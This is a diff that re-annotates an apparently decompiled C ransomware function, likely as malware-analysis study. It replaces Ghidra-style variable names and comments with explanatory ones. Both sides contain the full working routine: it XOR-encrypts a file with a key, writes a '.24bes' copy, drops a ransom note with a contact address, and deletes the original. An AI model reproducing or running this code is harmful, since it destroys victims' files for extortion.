@@ -1,16 +1,16 @@
-void encrypt_file(char *the_name_of_file_to_encrypt, char *key)   // Function to encrypt a file: the_name_of_file_to_encrypt = filename, key = key/password string
+void encrypt_file(char *the_name_of_file_to_encrypt, char *key)
 {
-  byte current_byte;                                     // Temporary byte variable used during encryption
-  ulong current_index;                                    // Temporary unsigned long variable (used for index math)
-  int iVar3;                                      // Integer to store return value of remove()
-  size_t length_of_key;                                   // Size variable to hold length of the key string
-  char local_848 [1024];                          // Buffer for note filename string
-  char local_448 [1032];                          // Buffer for encrypted filename string
-  FILE *local_40;                                 // File pointer for the ransom note file
-  void *memory_holding_file_contents;                                 // Pointer to memory buffer holding file contents
-  size_t file_size_in_bytes;                                // Variable to store size of the original file
-  FILE *file_to_encrypt;                                 // File pointer for the main file (original and encrypted)
-  ulong loop_counter;                                 // Loop counter for iterating over file bytes
+  byte current_byte;
+  ulong current_index;
+  int return_value_of_remove;
+  size_t length_of_key;
+  char ransomware_note_filename_string [1024];
+  char encrypted_filename_string [1032];
+  FILE *ransomware_note_file;
+  void *memory_holding_file_contents;
+  size_t file_size_in_bytes;
+  FILE *file_to_encrypt;
+  ulong loop_counter;
   
   // Open file 
   file_to_encrypt = fopen(the_name_of_file_to_encrypt,"rb");
@@ -46,31 +46,49 @@ void encrypt_file(char *the_name_of_file_to_encrypt, char *key)   // Function to
     for (loop_counter = 0; current_index = loop_counter, (long)loop_counter < (long)file_size_in_bytes; loop_counter = loop_counter + 1) {
       // Read byte number loop_counter from the buffer memory_holding_file_contents
       current_byte = memory_holding_file_contents[loop_counter];
-
       length_of_key = strlen(key);
-      
-      
+      // Takes 1 byte from file, XOR with one byte from the key, and writes the result into file buffer
+      // The modulo operator is just used to iterate over key, and then wrap around back to beginning
       memory_holding_file_contents[loop_counter] = current_byte ^ key[current_index % length_of_key];
     }
-    snprintf(local_448,0x400,"%s.24bes",the_name_of_file_to_encrypt); // Build new filename: "<original>.24bes" into local_448
-    file_to_encrypt = fopen(local_448,"wb");             // Open new file in binary write mode for encrypted data
-    fwrite(memory_holding_file_contents,1,file_size_in_bytes,file_to_encrypt);         // Write encrypted buffer to the new file
-    fclose(file_to_encrypt);                             // Close the encrypted file
-    free(memory_holding_file_contents);                               // Free the memory buffer holding file contents
-    snprintf(local_848,0x400,"%s_note.txt",local_448);  // Build note filename: "<encrypted>.24bes_note.txt"
-    local_40 = fopen(local_848,"w");              // Create/open the ransom note text file for writing
-    if (local_40 == (FILE *)0x0) {                // Check if note file creation failed
-      printf("Error creating note file: %s\n",local_848); // Print error if note could not be created
+
+    // This builds a new filename with 1024 bytes + padding
+    // The file will be named <original-file>.24bes
+    snprintf(encrypted_filename_string,0x400,"%s.24bes",the_name_of_file_to_encrypt);
+    
+    // Open new encrypted file    
+    file_to_encrypt = fopen(encrypted_filename_string,"wb");
+    // Write out encrypted file contents to encrypted file and close
+    fwrite(memory_holding_file_contents,1,file_size_in_bytes,file_to_encrypt);
+    fclose(file_to_encrypt);
+
+    // Free the memory that was holding file contents 
+    free(memory_holding_file_contents);
+    
+    // This builds a new filename with 1024 bytes + padding
+    // The file will be the ransomware note
+    snprintf(ransomware_note_filename_string,0x400,"%s_note.txt",encrypted_filename_string);
+
+    // Open ransomware note 
+    ransomware_note_file = fopen(ransomware_note_filename_string,"w");
+    
+    // Checks to see if we could successfully open / create file
+    if (ransomware_note_file == NULL) {
+      printf("Error creating note file: %s\n",ransomware_note_filename_string);
     }
-    else {                                        // If note file opened successfully
-      fwrite("This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com  to discuss payment for us providing you the decryption software..\n"
-             ,1,0x99,local_40);                   // Write the ransom note message into the note file
-      fclose(local_40);                           // Close the ransom note file
+    else {
+      fwrite("This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com  to discuss payment for us providing you the decryption software..\n",1,0x99,ransomware_note_file);
+      fclose(ransomware_note_file);
     }
-    iVar3 = remove(the_name_of_file_to_encrypt);                      // Delete the original unencrypted file
-    if (iVar3 != 0) {                             // Check if removal failed (non-zero return)
-      printf("Error deleting original file: %s\n",the_name_of_file_to_encrypt); // Print error if original file not deleted
+ 
+    // Delete the original file after it has been encrypted!
+    return_value_of_remove = remove(the_name_of_file_to_encrypt);
+
+    // Check if delete was successful
+    if (return_value_of_remove != 0) {
+      printf("Error deleting original file: %s\n",the_name_of_file_to_encrypt); 
     }
   }
-  return;                                         // Return from function (void)
+  return;
+} 
 
